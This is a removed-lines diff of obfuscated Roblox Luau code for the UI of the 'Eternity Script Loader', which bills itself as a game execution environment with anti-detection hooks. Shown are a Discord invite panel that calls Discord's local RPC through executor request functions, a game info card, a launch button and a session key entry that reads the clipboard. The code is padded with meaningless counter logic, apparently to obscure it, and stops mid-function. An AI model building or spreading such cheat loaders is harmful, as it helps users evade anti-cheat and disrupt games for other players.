-					stroke(frame24, Color3.fromRGB(48, 52, 75), 1, 0.5)
-					local imageLabel6 = Instance.new("ImageLabel", frame24)
-					imageLabel6.Size = UDim2.new(0, 24, 0, 24)
-					imageLabel6.Position = UDim2.new(0, 12, 0, 12)
-					imageLabel6.BackgroundTransparency = 1
-					imageLabel6.Image = "rbxassetid://92082907640636"
-					imageLabel6.ZIndex = 104
-					local textLabel8 = Instance.new("TextLabel", frame24)
-					textLabel8.Size = UDim2.new(1, -48, 0, 16)
-					textLabel8.Position = UDim2.new(0, 42, 0, 12)
-					textLabel8.Text = "OFFICIAL DISCORD"
-					textLabel8.Font = Enum.Font.GothamBold
-					textLabel8.TextSize = 11
-					textLabel8.TextColor3 = Color3.fromRGB(240, 240, 255)
-					textLabel8.BackgroundTransparency = 1
-					textLabel8.TextXAlignment = Enum.TextXAlignment.Left
-					textLabel8.ZIndex = 104
-					local textLabel9 = Instance.new("TextLabel", frame24)
-					textLabel9.Size = UDim2.new(1, -48, 0, 14)
-					textLabel9.Position = UDim2.new(0, 42, 0, 28)
-					textLabel9.Text = "Community & Support"
-					textLabel9.Font = Enum.Font.Gotham
-					textLabel9.TextSize = 9
-					textLabel9.TextColor3 = Color3.fromRGB(110, 110, 130)
-					textLabel9.BackgroundTransparency = 1
-					textLabel9.TextXAlignment = Enum.TextXAlignment.Left
-					textLabel9.ZIndex = 104
-					local textLabel10 = Instance.new("TextLabel", frame24)
-					textLabel10.Size = UDim2.new(1, -20, 0, 30)
-					textLabel10.Position = UDim2.new(0, 10, 0, 48)
-					textLabel10.Text = "Get direct script updates, support tickets, and chat with 15k+ members."
-					textLabel10.Font = Enum.Font.Gotham
-					textLabel10.TextSize = 9
-					textLabel10.TextColor3 = Color3.fromRGB(135, 135, 155)
-					textLabel10.BackgroundTransparency = 1
-					textLabel10.TextWrapped = true
-					textLabel10.TextXAlignment = Enum.TextXAlignment.Left
-					textLabel10.ZIndex = 104
-					local textButton6 = Instance.new("TextButton", frame24)
-					textButton6.Name = "RowDiscordBtn"
-					textButton6.Size = UDim2.new(1, -20, 0, 32)
-					textButton6.Position = UDim2.new(0, 10, 0, 88)
-					textButton6.Text = "Join Discord"
-					textButton6.Font = Enum.Font.GothamBold
-					textButton6.TextSize = 10
-					textButton6.TextColor3 = Color3.fromRGB(255, 255, 255)
-					textButton6.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
-					textButton6.BorderSizePixel = 0
-					textButton6.AutoButtonColor = false
-					textButton6.ZIndex = 105
-					corner(textButton6, 6)
-					stroke(textButton6, Color3.fromRGB(140, 155, 255), 1, 0.4)
-					textButton5 = Instance.new("TextButton", frame24)
-					textButton5.Name = "LoaderDiscordBtn"
-					textButton5.Size = UDim2.new(1, -20, 0, 28)
-					textButton5.Position = UDim2.new(0, 10, 0, 128)
-					textButton5.Text = ""
-					textButton5.BackgroundColor3 = Color3.fromRGB(24, 24, 34)
-					textButton5.BorderSizePixel = 0
-					textButton5.AutoButtonColor = false
-					textButton5.ZIndex = 105
-					corner(textButton5, 5)
-					stroke(textButton5, Color3.fromRGB(48, 50, 70), 1, 0.5)
-					local imageLabel7 = Instance.new("ImageLabel", textButton5)
-					imageLabel7.Size = UDim2.new(0, 12, 0, 12)
-					imageLabel7.Position = UDim2.new(0, 8, 0.5, -6)
-					imageLabel7.BackgroundTransparency = 1
-					imageLabel7.Image = "rbxassetid://92082907640636"
-					imageLabel7.ZIndex = 106
-					local textLabel11 = Instance.new("TextLabel", textButton5)
-					textLabel11.Size = UDim2.new(1, -24, 1, 0)
-					textLabel11.Position = UDim2.new(0, 22, 0, 0)
-					textLabel11.BackgroundTransparency = 1
-					textLabel11.Text = "Copy Server Link"
-					textLabel11.Font = Enum.Font.GothamBold
-					textLabel11.TextSize = 9
-					textLabel11.TextColor3 = Color3.fromRGB(200, 200, 220)
-					textLabel11.TextXAlignment = Enum.TextXAlignment.Center
-					textLabel11.ZIndex = 106
-					local n208 = nil
-
-					local function fn21(arg)
-						n208 = 40139334
-
-						pcall(function()
-							if v3 then
-								v3:Stop()
-								v3.TimePosition = 0
-								v3:Play()
-							end
-
-							if step6 == 361451889 then
-								return
-							end
-						end)
-
-						pcall(function()
-							if setclipboard then
-								setclipboard("https://discord.gg/eQFcharHwS")
-							end
-						end)
-
-						pcall(function()
-							local syn_ = syn
-
-							if syn_ then
-								syn_ = syn.request
-							end
-
-							if not syn_ then
-								syn_ = http
-
-								if syn_ then
-									syn_ = http.request
-								end
-							end
-
-							syn_ = syn_ or http_request or request
-							local HttpService = game:GetService("HttpService")
-
-							if syn_ and HttpService then
-								syn_({
-									Url = "http://127.0.0.1:6463/rpc?v=1",
-									Method = "POST",
-									Headers = {
-										["Content-Type"] = "application/json",
-										Origin = "https://discord.com",
-									},
-									Body = HttpService:JSONEncode({
-										cmd = "INVITE_BROWSER",
-										nonce = HttpService:GenerateGUID(false),
-										args = { code = "eQFcharHwS" },
-									}),
-								})
-							end
-
-							if n208 < count then
-								return
-							end
-						end)
-
-						if arg then
-							textButton6.Text = "Copied! ✓"
-							tween(textButton6, { BackgroundColor3 = Color3.fromRGB(59, 165, 93) }, 0.15)
-
-							task.delay(1.8, function()
-								if textButton6 and textButton6.Parent then
-									textButton6.Text = "Join Discord"
-									tween(textButton6, { BackgroundColor3 = Color3.fromRGB(88, 101, 242) }, 0.2)
-								end
-
-								if step8 == 975380873 then
-									return
-								end
-							end)
-						else
-							textLabel11.Text = "Invite Copied! ✓"
-							tween(textButton5, { BackgroundColor3 = Color3.fromRGB(59, 165, 93) }, 0.15)
-
-							task.delay(1.8, function()
-								if textLabel11 and textLabel11.Parent and textButton5 and textButton5.Parent then
-									textLabel11.Text = "Copy Server Link"
-									local tween_ = tween
-									local textButton7 = textButton5
-									local tbl22 = {}
-									local color3FromRGB = Color3.fromRGB
-									tbl22.BackgroundColor3 = color3FromRGB(24, 24, 34)
-									tween_(textButton7, tbl22, 0.2)
-								end
-							end)
-						end
-
-						if typeof(SendNotification) == "function" then
-							SendNotification("Eternity Discord", "Discord invite link copied to clipboard!", 3)
-						end
-					end
-
-					textButton6.MouseEnter:Connect(function()
-						tween(textButton6, { BackgroundColor3 = Color3.fromRGB(108, 122, 255) }, 0.15)
-					end)
-
-					textButton6.MouseLeave:Connect(function()
-						tween(textButton6, { BackgroundColor3 = Color3.fromRGB(88, 101, 242) }, 0.15)
-						return
-					end)
-
-					textButton6.MouseButton1Click:Connect(function()
-						if count == 506349099 then
-							step6 = 782919884
-							count += 439
-							L1.step2 -= 102
-							step7 += 1740
-							L1.step4 = 538092614
-						end
-
-						fn21(true)
-					end)
-
-					textButton5.MouseEnter:Connect(function()
-						tween(textButton5, { BackgroundColor3 = Color3.fromRGB(34, 34, 48) }, 0.15)
-						if step6 < L1.step3 then
-							return
-						end
-					end)
-
-					textButton5.MouseLeave:Connect(function()
-						tween(textButton5, { BackgroundColor3 = Color3.fromRGB(24, 24, 34) }, 0.15)
-						if count < step6 then
-							return
-						end
-					end)
-
-					textButton5.MouseButton1Click:Connect(function()
-						fn21(false)
-						if L1.step2 < L1.step3 then
-							return
-						end
-					end)
-				end
-
-				frame17 = Instance.new("Frame", frame15)
-				frame17.Name = "CenterPanel"
-				frame17.Size = UDim2.new(0.44, -7, 1, 0)
-				frame17.Position = UDim2.new(0.28, 3, 0, 0)
-				frame17.BackgroundColor3 = Color3.fromRGB(14, 14, 21)
-				frame17.BackgroundTransparency = 0.28
-				frame17.BorderSizePixel = 0
-				frame17.ZIndex = 102
-
-				do
-					local centerBg, centerScrim, centerStroke = fn17(frame17, 14, Color3.fromRGB(50, 52, 75))
-					tbl21.centerBg = centerBg
-					tbl21.centerScrim = centerScrim
-					tbl21.centerStroke = centerStroke
-				end
-
-				do
-					local frame24 = Instance.new("Frame", frame17)
-					frame24.Size = UDim2.new(1, -24, 0, 22)
-					frame24.Position = UDim2.new(0, 12, 0, 12)
-					frame24.BackgroundTransparency = 1
-					frame24.ZIndex = 103
-					local textLabel8 = Instance.new("TextLabel", frame24)
-					textLabel8.Size = UDim2.new(1, 0, 1, 0)
-					textLabel8.Text = "EXECUTION ENGINE"
-					textLabel8.Font = Enum.Font.GothamBold
-					textLabel8.TextSize = 10
-					textLabel8.TextColor3 = tbl17.accent
-					textLabel8.BackgroundTransparency = 1
-					textLabel8.TextXAlignment = Enum.TextXAlignment.Left
-					textLabel8.ZIndex = 103
-				end
-
-				local frame24 = Instance.new("Frame", frame17)
-				frame24.Size = UDim2.new(1, -24, 0, 1)
-				frame24.Position = UDim2.new(0, 12, 0, 36)
-				frame24.BackgroundColor3 = Color3.fromRGB(32, 34, 48)
-				frame24.BorderSizePixel = 0
-				frame24.ZIndex = 103
-				local frame25 = Instance.new("Frame", frame17)
-				frame25.Name = "StandardLaunchFrame"
-				frame25.Size = UDim2.new(1, 0, 1, -20)
-
-				do
-					local uDim2New = UDim2.new
-					local textLabel8 = 0
-					local textLabel9 = 0
-					local n206, frame26, imageLabel6, frame27
-
-					while true do
-						local frame28 = 10
-						frame25.Position = uDim2New(textLabel8, textLabel9, 0, frame28)
-						frame25.BackgroundTransparency = 1
-						frame25.BorderSizePixel = 0
-						frame25.ZIndex = 103
-						uDim2New = Instance.new("ImageLabel", frame25)
-						uDim2New.Name = "HeroEmblem"
-						frame28 = 0
-						local n207 = 48
-						uDim2New.Size = UDim2.new(0, 48, frame28, n207)
-						n207 = 10
-						uDim2New.Position = UDim2.new(0.5, -24, frame28, n207)
-						uDim2New.Image = "rbxassetid://139175707588865"
-						uDim2New.BackgroundTransparency = 1
-						uDim2New.ScaleType = Enum.ScaleType.Fit
-						uDim2New.ZIndex = 103
-						textLabel8 = Instance.new("TextLabel", frame25)
-						frame28 = -24
-						n207 = 0
-						textLabel8.Size = UDim2.new(1, frame28, n207, 20)
-						frame28 = 12
-						textLabel8.Position = UDim2.new(0, frame28, n207, 64)
-						textLabel8.Text = "ETERNITY SCRIPT LOADER"
-						textLabel8.Font = Enum.Font.GothamBold
-						textLabel8.TextSize = 14
-						frame28 = 245
-						n207 = 255
-						textLabel8.TextColor3 = Color3.fromRGB(245, frame28, n207)
-						textLabel8.BackgroundTransparency = 1
-						textLabel8.TextXAlignment = Enum.TextXAlignment.Center
-						textLabel8.ZIndex = 103
-						frame28 = frame25
-						textLabel9 = Instance.new("TextLabel", frame28)
-						frame28 = 1
-						n207 = -30
-						textLabel9.Size = UDim2.new(frame28, n207, 0, 22)
-						frame28 = 0
-						n207 = 15
-						textLabel9.Position = UDim2.new(frame28, n207, 0, 88)
-						textLabel9.Text = "Universal High-Performance Game Execution Environment with Real-Time Anti-Detection Hooks."
-						textLabel9.Font = Enum.Font.Gotham
-						textLabel9.TextSize = 9.5
-						frame28 = 140
-						n207 = 140
-						textLabel9.TextColor3 = Color3.fromRGB(frame28, n207, 160)
-						textLabel9.BackgroundTransparency = 1
-						textLabel9.TextWrapped = true
-						textLabel9.TextXAlignment = Enum.TextXAlignment.Center
-						textLabel9.ZIndex = 103
-						frame28 = nil
-						n207 = nil
-						frame26 = Instance.new("Frame", frame25)
-						frame26.Name = "GameInfoCard"
-						frame26.Size = UDim2.new(1, -36, 0, 96)
-						frame26.Position = UDim2.new(0, 18, 0, 162)
-						frame26.BackgroundColor3 = Color3.fromRGB(12, 13, 19)
-						frame26.BackgroundTransparency = 0.1
-						frame26.BorderSizePixel = 0
-						frame26.ClipsDescendants = true
-						frame26.ZIndex = 104
-						corner(frame26, 14)
-						stroke(frame26, Color3.fromRGB(50, 56, 82), 1.2, 0.5)
-						local imageLabel7 = Instance.new("ImageLabel", frame26)
-						imageLabel7.Name = "GameBannerBg"
-						imageLabel7.Size = UDim2.new(1, 0, 1, 0)
-						imageLabel7.Position = UDim2.new(0, 0, 0, 0)
-						imageLabel7.BackgroundTransparency = 1
-						imageLabel7.ScaleType = Enum.ScaleType.Crop
-						imageLabel7.ImageColor3 = Color3.fromRGB(80, 85, 110)
-						imageLabel7.ImageTransparency = 0.82
-						imageLabel7.ZIndex = 104
-						corner(imageLabel7, 14)
-
-						pcall(function()
-							n207 = 1056056582
-
-							if game.PlaceId and game.PlaceId > 0 then
-								imageLabel7.Image = "rbxthumb://type=GameThumbnail&id=" .. tostring(game.PlaceId) .. "&w=768&h=432"
-							end
-
-							if step == 948147176 then
-								return
-							end
-						end)
-
-						local frame29 = Instance.new("Frame", frame26)
-						frame29.Name = "BannerScrim"
-						frame29.Size = UDim2.new(1, 0, 1, 0)
-						frame29.BackgroundColor3 = Color3.fromRGB(11, 12, 18)
-						frame29.BackgroundTransparency = 0.08
-						frame29.BorderSizePixel = 0
-						frame29.ZIndex = 104
-						corner(frame29, 14)
-						local uiGradient3 = Instance.new("UIGradient", frame29)
-						uiGradient3.Rotation = 0
-
-						uiGradient3.Transparency = NumberSequence.new({
-							NumberSequenceKeypoint.new(0, 0),
-							NumberSequenceKeypoint.new(0.55, 0.12),
-							NumberSequenceKeypoint.new(0.85, 0.45),
-							NumberSequenceKeypoint.new(1, 0.75),
-						})
-
-						local frame30 = Instance.new("Frame", frame26)
-						frame30.Name = "InnerShadow"
-						frame30.Size = UDim2.new(1, 0, 1, 0)
-						frame30.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-						frame30.BackgroundTransparency = 0.45
-						frame30.BorderSizePixel = 0
-						frame30.ZIndex = 104
-						corner(frame30, 14)
-						local uiGradient4 = Instance.new("UIGradient", frame30)
-						uiGradient4.Rotation = 90
-
-						uiGradient4.Transparency = NumberSequence.new({
-							NumberSequenceKeypoint.new(0, 0.25),
-							NumberSequenceKeypoint.new(0.5, 0.6),
-							NumberSequenceKeypoint.new(1, 0.2),
-						})
-
-						local frame31 = Instance.new("Frame", frame26)
-						frame31.Name = "GameIconFrame"
-						frame31.Size = UDim2.new(0, 66, 0, 66)
-						frame31.Position = UDim2.new(0, 14, 0.5, -33)
-						frame31.BackgroundColor3 = Color3.fromRGB(18, 20, 30)
-						frame31.BorderSizePixel = 0
-						frame31.ClipsDescendants = true
-						frame31.ZIndex = 105
-						corner(frame31, 12)
-						stroke(frame31, Color3.fromRGB(56, 62, 92), 1.2, 0.45)
-						imageLabel6 = Instance.new("ImageLabel", frame31)
-						imageLabel6.Name = "GameThumbnail"
-						imageLabel6.Size = UDim2.new(1, 0, 1, 0)
-						imageLabel6.BackgroundTransparency = 1
-						imageLabel6.ScaleType = Enum.ScaleType.Crop
-						imageLabel6.ZIndex = 106
-						corner(imageLabel6, 11)
-
-						pcall(function()
-							frame28 = 426512059
-							local universeId = L1.tbl11.universeId
-
-							if not universeId then
-								universeId = game.GameId
-
-								if universeId then
-									universeId = game.GameId > 0
-								end
-
-								if universeId then
-									universeId = game.GameId
-								end
-							end
-
-							if universeId then
-								imageLabel6.Image = "rbxthumb://type=GameIcon&id=" .. tostring(universeId) .. "&w=150&h=150"
-							elseif game.PlaceId and game.PlaceId > 0 then
-								imageLabel6.Image = "rbxthumb://type=Asset&id=" .. tostring(game.PlaceId) .. "&w=150&h=150"
-							end
-						end)
-
-						frame27 = Instance.new("Frame", frame31)
-						frame27.Name = "IconGloss"
-						frame27.Size = UDim2.new(1, 0, 0.45, 0)
-
-						if count == L1.step3 then
-							step6 = 514074859
-							step8 += 1346
-							count = 589668795
-							step7 -= 1945
-							L1.step2 += 969
-							L1.step3 += 1555
-							step = 745145257
-							L1.step4 += 405
-						else
-							break
-						end
-					end
-
-					frame27.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-					frame27.BackgroundTransparency = 0.94
-					frame27.BorderSizePixel = 0
-					frame27.ZIndex = 107
-					local frame28 = Instance.new("Frame", frame26)
-					frame28.Name = "RightContent"
-					frame28.Size = UDim2.new(1, -98, 1, -20)
-					frame28.Position = UDim2.new(0, 90, 0, 10)
-					frame28.BackgroundTransparency = 1
-					frame28.ZIndex = 105
-					local frame29 = Instance.new("Frame", frame28)
-					frame29.Name = "HeaderRow"
-					frame29.Size = UDim2.new(1, 0, 0, 18)
-					frame29.Position = UDim2.new(0, 0, 0, 0)
-					frame29.BackgroundTransparency = 1
-					frame29.ZIndex = 105
-					local frame30 = Instance.new("Frame", frame29)
-					frame30.Name = "PulseGlow"
-					frame30.Size = UDim2.new(0, 10, 0, 10)
-					frame30.Position = UDim2.new(0, 0, 0.5, -5)
-					frame30.BackgroundColor3 = Color3.fromRGB(80, 220, 130)
-					frame30.BackgroundTransparency = 0.65
-					frame30.BorderSizePixel = 0
-					frame30.ZIndex = 106
-					corner(frame30, 5)
-					local frame31 = Instance.new("Frame", frame29)
-					frame31.Name = "TargetDot"
-					frame31.Size = UDim2.new(0, 6, 0, 6)
-					frame31.Position = UDim2.new(0, 2, 0.5, -3)
-					frame31.BackgroundColor3 = Color3.fromRGB(120, 255, 170)
-					frame31.BorderSizePixel = 0
-					frame31.ZIndex = 107
-					corner(frame31, 3)
-					local textLabel10 = Instance.new("TextLabel", frame29)
-					textLabel10.Size = UDim2.new(1, -90, 1, 0)
-					textLabel10.Position = UDim2.new(0, 16, 0, 0)
-					textLabel10.Text = "TARGET EXPERIENCE"
-					textLabel10.Font = Enum.Font.GothamBold
-					textLabel10.TextSize = 8.5
-					textLabel10.TextColor3 = Color3.fromRGB(165, 180, 215)
-					textLabel10.BackgroundTransparency = 1
-					textLabel10.TextXAlignment = Enum.TextXAlignment.Left
-					textLabel10.ZIndex = 106
-					local frame32 = Instance.new("Frame", frame29)
-					frame32.Name = "UnivBadge"
-					frame32.Size = UDim2.new(0, 78, 0, 18)
-					frame32.Position = UDim2.new(1, -78, 0.5, -9)
-					frame32.BackgroundColor3 = Color3.fromRGB(16, 28, 22)
-					frame32.BorderSizePixel = 0
-					frame32.ZIndex = 106
-					corner(frame32, 5)
-					stroke(frame32, Color3.fromRGB(48, 160, 92), 1, 0.45)
-					local textLabel11 = Instance.new("TextLabel", frame32)
-					textLabel11.Size = UDim2.new(1, 0, 1, 0)
-					textLabel11.Text = "UNIVERSAL"
-					textLabel11.Font = Enum.Font.GothamBold
-					textLabel11.TextSize = 8
-					textLabel11.TextColor3 = Color3.fromRGB(80, 225, 135)
-					textLabel11.BackgroundTransparency = 1
-					textLabel11.TextXAlignment = Enum.TextXAlignment.Center
-					textLabel11.ZIndex = 107
-					local textLabel12 = Instance.new("TextLabel", frame28)
-					textLabel12.Name = "GameTitleLabel"
-					textLabel12.Size = UDim2.new(1, 0, 0, 22)
-					textLabel12.Position = UDim2.new(0, 0, 0, 24)
-					local name4 = L1.tbl11.name
-
-					if not name4 or name4 == "" then
-						name4 = tostring(game.Name or "")
-
-						if name4 == "" or string.lower(name4) == "ugc" or string.lower(name4) == "game" then
-							name4 = "Universal Game Environment"
-						end
-					end
-
-					textLabel12.Text = name4
-					textLabel12.Font = Enum.Font.GothamBold
-					textLabel12.TextSize = 13.5
-					textLabel12.TextColor3 = Color3.fromRGB(255, 255, 255)
-					textLabel12.BackgroundTransparency = 1
-					textLabel12.TextXAlignment = Enum.TextXAlignment.Left
-					textLabel12.TextTruncate = Enum.TextTruncate.AtEnd
-					textLabel12.ZIndex = 106
-					local textLabel13 = Instance.new("TextLabel", frame28)
-					textLabel13.Name = "GameSubLabel"
-					textLabel13.Size = UDim2.new(1, 0, 0, 18)
-					textLabel13.Position = UDim2.new(0, 0, 0, 50)
-					local str3 = tostring(game.PlaceId or 0)
-					local str4 = tostring(game.JobId or "")
-					local str5
-
-					if #str4 > 8 then
-						str5 = string.sub(str4, 1, 8) .. "..."
-
-						if not str5 then
-							str5 = str4 ~= ""
-
-							if str5 then
-								str5 = str4
-							end
-
-							str5 = str5 or "Standard Server"
-						end
-					else
-						str5 = str4 ~= ""
-
-						if str5 then
-							str5 = str4
-						end
-
-						str5 = str5 or "Standard Server"
-					end
-
-					textLabel13.Text = "Place ID: " .. str3 .. "  •  Server: " .. str5
-					textLabel13.Font = Enum.Font.GothamMedium
-					textLabel13.TextSize = 8.5
-					textLabel13.TextColor3 = Color3.fromRGB(135, 140, 165)
-					textLabel13.BackgroundTransparency = 1
-					textLabel13.TextXAlignment = Enum.TextXAlignment.Left
-					textLabel13.TextTruncate = Enum.TextTruncate.AtEnd
-					textLabel13.ZIndex = 106
-
-					L1.tbl11:OnReady(function(arg)
-						if arg.name and #arg.name > 0 and textLabel12 and textLabel12.Parent then
-							textLabel12.Text = tostring(arg.name)
-						end
-
-						if arg.universeId and imageLabel6 and imageLabel6.Parent then
-							imageLabel6.Image = "rbxthumb://type=GameIcon&id=" .. tostring(arg.universeId) .. "&w=150&h=150"
-						end
-
-						if arg.iconAssetId and arg.iconAssetId > 0 and imageLabel6 and imageLabel6.Parent then
-							imageLabel6.Image = "rbxassetid://" .. tostring(arg.iconAssetId)
-						end
-					end)
-				end
-
-				local textButton6, uiGradient3
-
-				do
-					local udim24 = UDim2.new(0, 28, 0, 282)
-					local udim25 = UDim2.new(0, 25, 0, 280)
-					local udim26 = UDim2.new(1, -56, 0, 48)
-					local udim27 = UDim2.new(1, -50, 0, 50)
-					textButton6 = Instance.new("TextButton", frame17)
-					textButton6.Name = "KeyBtn"
-					textButton6.Size = udim26
-					textButton6.Position = udim24
-					textButton6.Text = "Load Script  ▶"
-					textButton6.Font = Enum.Font.GothamBold
-					textButton6.TextSize = 14
-					textButton6.TextColor3 = Color3.fromRGB(16, 16, 24)
-					textButton6.BackgroundColor3 = Color3.fromRGB(244, 246, 252)
-					textButton6.BorderSizePixel = 0
-					textButton6.AutoButtonColor = false
-					textButton6.ZIndex = 103
-					corner(textButton6, 10)
-					local imageLabel6 = Instance.new("ImageLabel", textButton6)
-					imageLabel6.Name = "VerifyIcon"
-					imageLabel6.Size = UDim2.new(0, 16, 0, 16)
-					imageLabel6.Position = UDim2.new(0.5, 80, 0.5, -8)
-					imageLabel6.BackgroundTransparency = 1
-					imageLabel6.Image = "rbxthumb://type=Asset&id=100074368064051&w=150&h=150"
-					imageLabel6.Visible = false
-					imageLabel6.ZIndex = 104
-					local v4 = stroke(textButton6, Color3.fromRGB(255, 255, 255), 1.5, 0.3)
-					uiGradient3 = Instance.new("UIGradient", v4)
-
-					uiGradient3.Transparency = NumberSequence.new({
-						NumberSequenceKeypoint.new(0, 1),
-						NumberSequenceKeypoint.new(0.3, 1),
-						NumberSequenceKeypoint.new(0.5, 0),
-						NumberSequenceKeypoint.new(0.7, 1),
-						NumberSequenceKeypoint.new(1, 1),
-					})
-
-					textButton6.MouseEnter:Connect(function()
-						tween(textButton6, {
-							Size = udim27,
-							Position = udim25,
-							BackgroundColor3 = Color3.fromRGB(255, 255, 255),
-						}, 0.18, Enum.EasingStyle.Quint)
-					end)
-
-					local n207 = nil
-
-					textButton6.MouseLeave:Connect(function()
-						n207 = 929333569
-						tween(textButton6, { BackgroundColor3 = Color3.fromRGB(244, 246, 252) }, 0.2, Enum.EasingStyle.Quint)
-						tween(textButton6, { Size = udim26, Position = udim24 }, 0.2, Enum.EasingStyle.Quint)
-						if n207 < step then
-							return
-						end
-					end)
-				end
-
-				local frame26 = Instance.new("Frame", frame17)
-				frame26.Name = "LoadProgressTrack"
-				frame26.Size = UDim2.new(1, -56, 0, 5)
-				frame26.Position = UDim2.new(0, 28, 0, 344)
-				frame26.BackgroundColor3 = Color3.fromRGB(22, 24, 32)
-				frame26.BackgroundTransparency = 1
-				frame26.BorderSizePixel = 0
-				frame26.ZIndex = 105
-				frame26.ClipsDescendants = true
-				corner(frame26, 3)
-				local frame27 = Instance.new("Frame", frame26)
-				frame27.Name = "LoadProgressBar"
-				frame27.Size = UDim2.new(0, 0, 1, 0)
-				frame27.Position = UDim2.new(0, 0, 0, 0)
-				frame27.BackgroundColor3 = tbl17.accent
-				frame27.BackgroundTransparency = 1
-				frame27.BorderSizePixel = 0
-				frame27.ZIndex = 106
-				corner(frame27, 3)
-				local frame28 = Instance.new("Frame", frame27)
-				frame28.Size = UDim2.new(0, 18, 1, 0)
-				frame28.Position = UDim2.new(1, -9, 0, 0)
-				frame28.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-				frame28.BackgroundTransparency = 0.5
-				frame28.BorderSizePixel = 0
-				frame28.ZIndex = 107
-				corner(frame28, 3)
-				local textLabel8 = Instance.new("TextLabel", frame17)
-				textLabel8.Size = UDim2.new(1, -56, 0, 16)
-				textLabel8.Position = UDim2.new(0, 28, 0, 356)
-				textLabel8.Text = ""
-				textLabel8.Font = Enum.Font.Gotham
-				textLabel8.TextSize = 10
-				textLabel8.TextColor3 = tbl17.danger
-				textLabel8.BackgroundTransparency = 1
-				textLabel8.TextXAlignment = Enum.TextXAlignment.Center
-				textLabel8.ZIndex = 103
-				local frame29 = Instance.new("Frame", frame17)
-				frame29.Name = "KeySystemContainer"
-				frame29.Size = UDim2.new(1, -40, 0, 310)
-				frame29.Position = UDim2.new(0, 20, 0, 50)
-				frame29.BackgroundTransparency = 1
-				frame29.BorderSizePixel = 0
-				frame29.ZIndex = 103
-				frame29.Visible = false
-
-				do
-					frame29:GetPropertyChangedSignal("Visible"):Connect(function()
-						if L1.step4 == 225848822 then
-							L1.step3 -= 953
-							step6 = 107422419
-						end
-
-						if frame29.Visible then
-							frame25.Visible = false
-						else
-							frame25.Visible = true
-						end
-					end)
-				end
-
-				local textLabel9 = Instance.new("TextLabel", frame29)
-				textLabel9.Size = UDim2.new(1, 0, 0, 22)
-				textLabel9.Position = UDim2.new(0, 0, 0, 10)
-				textLabel9.Text = "SESSION KEY REQUIRED"
-				textLabel9.Font = Enum.Font.GothamBold
-				textLabel9.TextSize = 15
-				textLabel9.TextColor3 = Color3.fromRGB(245, 245, 255)
-				textLabel9.BackgroundTransparency = 1
-				textLabel9.TextXAlignment = Enum.TextXAlignment.Center
-				textLabel9.ZIndex = 104
-				local textLabel10 = Instance.new("TextLabel", frame29)
-				textLabel10.Size = UDim2.new(1, 0, 0, 28)
-				textLabel10.Position = UDim2.new(0, 0, 0, 34)
-				textLabel10.Text = "This script requires an active 24h session key.\nEnter your key or generate one below to launch."
-				textLabel10.Font = Enum.Font.Gotham
-				textLabel10.TextSize = 10
-				textLabel10.TextColor3 = Color3.fromRGB(130, 130, 150)
-				textLabel10.BackgroundTransparency = 1
-				textLabel10.TextWrapped = true
-				textLabel10.TextXAlignment = Enum.TextXAlignment.Center
-				textLabel10.ZIndex = 104
-				local frame30 = Instance.new("Frame", frame29)
-				frame30.Size = UDim2.new(1, 0, 0, 42)
-				frame30.Position = UDim2.new(0, 0, 0, 72)
-				frame30.BackgroundColor3 = Color3.fromRGB(16, 16, 23)
-				frame30.BorderSizePixel = 0
-				frame30.ZIndex = 104
-				corner(frame30, 8)
-				stroke(frame30, Color3.fromRGB(48, 52, 75), 1, 0.4)
-				local imageLabel6 = Instance.new("ImageLabel", frame30)
-				imageLabel6.Size = UDim2.new(0, 18, 0, 18)
-				imageLabel6.Position = UDim2.new(0, 10, 0.5, -9)
-				imageLabel6.Image = "rbxassetid://112223362343120"
-				imageLabel6.BackgroundTransparency = 1
-				imageLabel6.ScaleType = Enum.ScaleType.Fit
-				imageLabel6.ZIndex = 105
-				local textBox2 = Instance.new("TextBox", frame30)
-				textBox2.Size = UDim2.new(1, -125, 1, 0)
-				textBox2.Position = UDim2.new(0, 36, 0, 0)
-				textBox2.PlaceholderText = "Paste your 24-hour key here..."
-				textBox2.Text = ""
-				textBox2.Font = Enum.Font.GothamBold
-				textBox2.TextSize = 11
-				textBox2.TextColor3 = Color3.fromRGB(235, 235, 245)
-				textBox2.PlaceholderColor3 = Color3.fromRGB(85, 85, 105)
-				textBox2.BackgroundTransparency = 1
-				textBox2.BorderSizePixel = 0
-				textBox2.ClearTextOnFocus = false
-				textBox2.TextXAlignment = Enum.TextXAlignment.Left
-				textBox2.ZIndex = 105
-				local textButton7 = Instance.new("TextButton", frame30)
-				textButton7.Name = "KsPasteBtn"
-				textButton7.Size = UDim2.new(0, 68, 0, 30)
-				textButton7.Position = UDim2.new(1, -76, 0.5, -15)
-				textButton7.Text = "Paste"
-				textButton7.Font = Enum.Font.GothamBold
-				textButton7.TextSize = 10.5
-				textButton7.TextColor3 = Color3.fromRGB(220, 220, 240)
-				textButton7.BackgroundColor3 = Color3.fromRGB(26, 28, 40)
-				textButton7.BorderSizePixel = 0
-				textButton7.AutoButtonColor = false
-				textButton7.Active = true
-				textButton7.Selectable = true
-				textButton7.ZIndex = 106
-				corner(textButton7, 6)
-				stroke(textButton7, Color3.fromRGB(52, 56, 80), 1, 0.5)
-
-				do
-					textButton7.MouseEnter:Connect(function()
-						if textButton7.Text == "Paste" then
-							tween(textButton7, { BackgroundColor3 = Color3.fromRGB(36, 40, 58) }, 0.15)
-						end
-					end)
-				end
-
-				textButton7.MouseLeave:Connect(function()
-					if textButton7.Text == "Paste" then
-						tween(textButton7, { BackgroundColor3 = Color3.fromRGB(26, 28, 40) }, 0.15)
-					end
-				end)
-
-				do
-					local function getText()
-						for _, v4 in ipairs({
-							function()
-								if typeof(getclipboard) == "function" then
-									return getclipboard()
-								end
-							end,
-							function()
-								if getgenv and typeof(getgenv().getclipboard) == "function" then
-									return getgenv().getclipboard()
-								end
-							end,
-							function()
-								if typeof(get_clipboard) == "function" then
-									return get_clipboard()
-								end
-
-								if L1.step4 == 573097168 then
-									step += 1538
-									L1.step3 = 650477178
-									L1.step4 = 977231041
-									count -= 620
-									L1.step2 = 125454339
-								end
-							end,
-							function()
-								if getgenv and typeof(getgenv().get_clipboard) == "function" then
-									return getgenv().get_clipboard()
-								end
-							end,
-							function()
-								if typeof(fromclipboard) == "function" then
-									return fromclipboard()
-								end
-							end,
-							function()
-								if getgenv and typeof(getgenv().fromclipboard) == "function" then
-									return getgenv().fromclipboard()
-								end
-							end,
-							function()
-								if syn and typeof(syn.get_clipboard) == "function" then
